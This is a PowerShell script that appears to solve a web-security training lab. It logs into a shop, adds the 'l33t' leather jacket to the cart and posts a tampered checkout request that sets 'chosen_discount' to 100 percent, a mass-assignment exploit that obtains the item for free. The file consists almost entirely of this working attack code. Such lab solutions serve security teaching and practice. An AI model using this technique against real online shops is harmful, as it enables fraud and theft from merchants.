param (
    [Parameter(Mandatory = $true)]
    [string]$server,
    [Parameter(Mandatory = $true)]
    [string]$username,
    [Parameter(Mandatory = $true)]
    [string]$password
)

. "../../scripts/GetInputFieldValueByName.ps1"

if ($server.EndsWith("/")) {
    $server = $server.Substring(0, $server.Length - 1)
}

if ($server.startsWith("https://")) {
    $url = $server;
}
else {
    Write-Host `n"Wrong Server Format"`n
    exit
}

$headers = @{
    "Content-Type" = "application/json"
}

$commandurl = $url + "/login";

#get token to login
$response = iwr -URI $commandurl -SessionVariable requestSession -Method Get;

$data = "csrf=" + ( GetInputFieldValueByName $response "csrf" ) + "&username=$username&password=$password"
$response = iwr -URI $commandurl -WebSession $requestSession -Method Post -Body $data;

$commandurl = $url + "/cart"
$data = "productId=1&redir=PRODUCT&quantity=1"
$response = iwr -URI $commandurl -WebSession $requestSession -Method Post -Body $data;

$commandurl = $url + "/cart"
$response = iwr -URI $commandurl -WebSession $requestSession -Method Get;

$commandurl = $url + "/api/checkout";
$response = iwr -URI $commandurl -WebSession $requestSession -Method Get;
Write-Host `n($response.Content | ConvertFrom-Json | ConvertTo-Json)`n
#@{percentage=0} {@{product_id=1; name=Lightweight "l33t" Leather Jacket; quantity=1; item_price=133700}}

$commandurl = $url + "/api/checkout";
$data = @{"chosen_discount" = @{percentage = 100 }; "chosen_products" = @(@{product_id = "1"; name = 'Lightweight "l33t" Leather Jacket'; quantity = 1; item_price = 133700 }) } | ConvertTo-Json;
Write-Host `n$data`n
$response = iwr -URI $commandurl -WebSession $requestSession -Method Post -Body $data;
$response.Content | ConvertFrom-Json | ConvertTo-Json

